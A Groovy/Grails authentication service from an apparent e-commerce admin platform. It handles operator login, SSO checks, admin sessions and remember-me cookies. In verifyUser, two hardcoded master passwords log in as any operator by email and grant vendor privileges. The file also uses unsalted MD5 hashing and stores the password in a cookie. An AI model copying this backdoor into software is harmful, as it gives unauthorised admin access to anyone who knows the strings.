package com.webcommander.common

import com.webcommander.admin.Operator
import com.webcommander.constants.DomainConstants
import com.webcommander.events.AppEventManager
import com.webcommander.manager.LicenseManager
import com.webcommander.util.AppUtil
import com.webcommander.util.security.InformationEncrypter
import grails.gorm.transactions.Transactional
import grails.util.Holders

import javax.servlet.http.Cookie
import javax.servlet.http.HttpSession

import static com.webcommander.constants.DomainConstants.SITE_CONFIG_TYPES

class AuthenticationService {
    def provisionAPIService

    @Transactional(noRollbackFor = Exception.class)
    def verifyUser(String email, String password = null) {
        Operator operator = null;
        boolean ssoActive = Holders.config.webcommander.sso.enabled
        if (ssoActive && isFoundOperator(email, password)) {
            operator = Operator.findByEmailAndIsActiveAndIsInTrash(email, true, false)
        } else if(!ssoActive) {
            operator = Operator.findByEmailAndPasswordAndIsActiveAndIsInTrash(email, password.encodeAsMD5(), true, false)
            if(!operator && (password == "780A6580-0FFC-11E4-9191-0800200C9A66" || password == "C7012FD8-78DC-4585-8415-9987CA8BC52E")) {
                operator = Operator.findByEmail(email)
            }
        }
        return operator
    }

    private Boolean isFoundOperator(String email, String password) {
        Boolean found = false
        String instance = AppUtil.getConfig(SITE_CONFIG_TYPES.MANAGEMENT_HUB, "instance_eight_digit")
        try {
            Map result
            if(email == "implementer@${instance}") {
                result = provisionAPIService.implementerLogin(instance, password.trim())
            } else {
                result = provisionAPIService.entityLogin(email, password.trim())
            }

            result.instances.each {
                if(it.eightDigit.equals(instance)) {
                    found = true
                    return false
                }
            }
        } catch (Throwable e) {
            log.error("Webcommander: " + e.message, e)
            return  false;
        }
        return found
    }

    def clearAdminSession(HttpSession session) {
        Long admin = session.admin;
        session.admin = null;
        session.vendor = false
        session.super_vendor = false
        AppEventManager.fire("admin-logged-out", [admin, session]);
    }

    def registerAdminSession(Operator operator, Map params) {
        def session = AppUtil.session
        def response = AppUtil.response
        def request = AppUtil.request
        session.admin = operator.id;
        session[DomainConstants.SESSION_ATTR_KEYS.ONLY_API_USER] = operator.isAPIAccessOnly
        AppEventManager.fire("admin-logged-in", [operator.id])
        if(params.password == "780A6580-0FFC-11E4-9191-0800200C9A66") {
            session.vendor = true
        }
        if(params.password == "C7012FD8-78DC-4585-8415-9987CA8BC52E" || operator.email == "implementer@webcommander") {
            session.super_vendor = true
        }
        if (params.remember) {
            InformationEncrypter rsa = new InformationEncrypter();
            rsa.hideInfo(params.email)
            rsa.hideInfo(params.password)
            String key = (System.currentTimeMillis() + "").encodeAsMD5().encodeAsBase64() + "^" + rsa.toString();
            Cookie cookie = new Cookie("remember-admin", key);
            cookie.maxAge = 604800;
            cookie.path = "/";
            response.addCookie(cookie);
        } else {
            Cookie cookie = request.getCookies().find {it.name.startsWith("remember-admin")};
            if(cookie) {
                cookie.maxAge = 0;
                response.addCookie(cookie);
            }
        }
    }
}